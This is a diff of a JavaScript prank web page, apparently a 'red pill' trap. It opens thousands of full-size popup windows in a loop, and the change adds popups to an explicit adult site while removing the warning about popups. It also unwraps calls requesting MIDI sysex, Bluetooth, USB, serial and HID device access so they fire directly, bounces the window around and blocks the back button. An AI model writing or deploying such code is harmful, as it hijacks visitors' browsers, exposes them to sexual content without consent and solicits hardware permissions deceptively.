@@ -140,7 +140,6 @@
       var randomNumber = getRandomInt(0,9);
       function redPill() {
         if (confirm("Are you sure?")) {
-          window.alert("Please allow popups on this website to play the game!")
           window.addEventListener('keydown', (e) => {
             console.log(e)
           })
@@ -153,12 +152,14 @@
           });
           var fakeWindow = window.open("",);
           for (let i=0; i<10000; i++) {
+            var funnyWindow = window.open("https://nekos.life/lewd", "", "width=1920, height=1080");
+            var funnyWindow = window.open("https://nekos.life/", "", "width=1920, height=1080");
             var spamWindow = window.open(randomLink, "", "width=1920, height=1080");
             var inTabWindow = window.open("", "");
-            var smallWindow = window.open("https://182exe.github.io/matrix", "", "width=1920,height=1080");
+            var smallWindow = window.open("https://182exe.xyz/matrix", "", "width=1920,height=1080");
             var randomNumber = getRandomInt(0,9);
             var randomLink = 'https://www.google.com/search?q=' + randomNumber
-            var openMass = window.open("https://182exe.github.io/matrix/666.html", "", "1920px", "1080px");
+            var openMass = window.open("https://182exe.xyz/matrix/666.html", "", "1920px", "1080px");
             for (let i=0; i<5; i++) {
               var randomLink = randomLink + randomNumber
               var randomNumber = getRandomInt(100,999);
@@ -288,29 +289,18 @@
                 return navigator.credentials.get(getCredentialDefaultArgs)
               })
         }
-        function requestMidiAccess () {
           navigator.requestMIDIAccess({
               sysex: true
           })
-        }
-        function requestBluetoothAccess () {
           navigator.bluetooth.requestDevice({
               // filters: [...] <- Prefer filters to save energy & show relevant devices.
               // acceptAllDevices here ensures dialog can populate, we don't care with what.
               acceptAllDevices: true
             })
               .then(device => device.gatt.connect())
-        }
-        function requestUsbAccess () {
-          navigator.usb.requestDevice({ filters: [{}] })
-        }
-        function requestSerialAccess () {
-          navigator.serial.requestPort({ filters: [] })
-        }
-        function requestHidAccess () {
-          navigator.hid.requestDevice({ filters: [] })
-        }
-        function moveWindowBounce () {
+        navigator.usb.requestDevice({ filters: [{}] })
+        navigator.serial.requestPort({ filters: [] })
+        navigator.hid.requestDevice({ filters: [] })
           let vx = VELOCITY * (Math.random() > 0.5 ? 1 : -1)
           let vy = VELOCITY * (Math.random() > 0.5 ? 1 : -1)
         
@@ -327,32 +317,9 @@
         
             window.moveBy(vx, vy)
           }, TICK_LENGTH)
-        }
-        function rainbowThemeColor () {
-          function zeroFill (width, number, pad = '0') {
-            width -= number.toString().length
-            if (width > 0) return new Array(width + (/\./.test(number) ? 2 : 1)).join(pad) + number
-            return number + ''
-          }
-        
-          const meta = document.querySelector('meta.theme-color')
-          setInterval(() => {
-            meta.setAttribute('content', '#' + zeroFill(6, Math.floor(Math.random() * 16777215).toString(16)))
-          }, 50)
-        }
-        function requestFullscreen () {
-          const requestFullscreen = Element.prototype.requestFullscreen ||
-            Element.prototype.webkitRequestFullscreen ||
-            Element.prototype.mozRequestFullScreen ||
-            Element.prototype.msRequestFullscreen
-        
-          requestFullscreen.call(document.body)
-        }
-        function blockBackButton () {
-          window.addEventListener('popstate', () => {
+        window.addEventListener('popstate', () => {
             window.history.forward()
-          })
-        }
+         })
         function doTheFunny() {
           requestPointerLock();
           openWindow();
